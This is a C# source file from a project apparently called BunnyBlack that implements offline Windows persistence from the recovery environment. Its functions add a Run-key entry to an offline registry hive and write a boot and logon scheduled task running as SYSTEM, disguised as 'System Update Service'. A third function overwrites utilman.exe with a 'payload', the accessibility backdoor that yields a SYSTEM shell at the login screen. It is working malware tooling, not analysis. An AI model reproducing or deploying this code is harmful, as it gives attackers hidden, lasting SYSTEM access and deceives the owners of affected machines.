// language: C#, file: Core/PersistenceHelper.cs
// Оффлайн персистентность: Run-ключ, Scheduled Task, utilman — работают из WinRE.
using System;
using System.Diagnostics;
using System.IO;
using Microsoft.Win32;

namespace BunnyBlack.Core
{
    public static class PersistenceHelper
    {
        public static bool AddOfflineRunKey(string entryName, string targetPath)
        {
            try
            {
                using (var k = Registry.LocalMachine.OpenSubKey(
                    @"BunnyBlack_Offline_SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true))
                {
                    if (k == null) { Debug.WriteLine("[AddOfflineRunKey] no hive"); return false; }
                    k.SetValue(entryName, targetPath);
                    return true;
                }
            }
            catch (Exception ex) { Debug.WriteLine($"[AddOfflineRunKey] {ex.Message}"); return false; }
        }

        public static bool AddOfflineScheduledTask(string taskName, string exePath)
        {
            try
            {
                string sysDrive = RegistryHelper.GetSystemDrive();
                string tasksDir = Path.Combine(sysDrive, @"Windows\System32\Tasks");
                if (!Directory.Exists(tasksDir)) { Debug.WriteLine($"[Task] no dir: {tasksDir}"); return false; }

                string taskPath = Path.Combine(tasksDir, taskName);
                File.WriteAllText(taskPath, BuildTaskXml(exePath));
                return true;
            }
            catch (Exception ex) { Debug.WriteLine($"[AddOfflineTask] {ex.Message}"); return false; }
        }

        private static string BuildTaskXml(string exePath)
        {
            return $@"<?xml version=""1.0"" encoding=""UTF-16""?>
<Task version=""1.2"" xmlns=""http://schemas.microsoft.com/windows/2004/02/mit/task"">
  <RegistrationInfo>
    <Author>System</Author>
    <Description>System Update Service</Description>
  </RegistrationInfo>
  <Triggers>
    <BootTrigger><Enabled>true</Enabled></BootTrigger>
    <LogonTrigger><Enabled>true</Enabled></LogonTrigger>
  </Triggers>
  <Principals>
    <Principal id=""Author"">
      <UserId>S-1-5-18</UserId>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <AllowHardTerminate>true</AllowHardTerminate>
    <StartWhenAvailable>true</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <IdleSettings><StopOnIdleEnd>false</StopOnIdleEnd></IdleSettings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>false</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
    <Priority>7</Priority>
  </Settings>
  <Actions Context=""Author"">
    <Exec>
      <Command>{exePath}</Command>
    </Exec>
  </Actions>
</Task>";
        }

        public static bool ReplaceUtilmanPersistent(string payloadPath)
        {
            try
            {
                string sysDrive = RegistryHelper.GetSystemDrive();
                string utilman = Path.Combine(sysDrive, @"Windows\System32\utilman.exe");
                string backup = utilman + ".bak";

                if (!File.Exists(payloadPath)) { Debug.WriteLine("[ReplaceUtilman] no payload"); return false; }
                if (!File.Exists(utilman)) { Debug.WriteLine("[ReplaceUtilman] no utilman"); return false; }

                if (!File.Exists(backup)) File.Copy(utilman, backup, true);
                File.Copy(payloadPath, utilman, true);
                return true;
            }
            catch (Exception ex) { Debug.WriteLine($"[ReplaceUtilman] {ex.Message}"); return false; }
        }
    }
}